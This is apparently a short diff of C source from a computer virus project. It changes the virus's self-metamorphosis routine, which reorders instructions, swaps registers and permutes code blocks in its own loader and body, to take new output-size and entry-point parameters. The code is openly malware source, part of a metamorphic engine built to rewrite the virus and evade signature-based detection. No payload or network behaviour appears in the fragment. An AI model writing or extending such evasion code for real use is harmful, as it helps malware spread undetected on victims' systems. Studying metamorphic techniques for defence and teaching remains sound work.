@@ -25,8 +25,8 @@
 **   syscall calling conventions.
 */
 
-bool		metamorph_self(struct safe_ptr clone, size_t loader_off, \
-			uint64_t seed)
+bool		metamorph_self(struct safe_ptr clone, size_t *output_size,
+			size_t *entry_point, size_t loader_off, uint64_t seed)
 {
 	// get client loader pointer
 	size_t	loader_size         = loader_exit - loader_entry;
@@ -42,10 +42,15 @@ bool		metamorph_self(struct safe_ptr clone, size_t loader_off, \
 	if (!clone_loader_entry || !entire_virus)
 		return errors(ERR_VIRUS, _ERR_IMPOSSIBLE);
 
+	struct safe_ptr	original = (struct safe_ptr){
+		.ptr  = entire_virus,
+		.size = virus_size
+	};
+
 	// metamorph self and client
 	if (!permutate_instructions(clone_loader_entry, seed, loader_size)
 	|| !permutate_registers(clone_loader_entry, seed, loader_size)
-	|| !permutate_blocks(entire_virus, seed, virus_size)
+	|| !permutate_blocks(original, clone, output_size, entry_point, seed)
 	|| !true)
 		return errors(ERR_THROW, _ERR_METAMORPH_SELF);
 
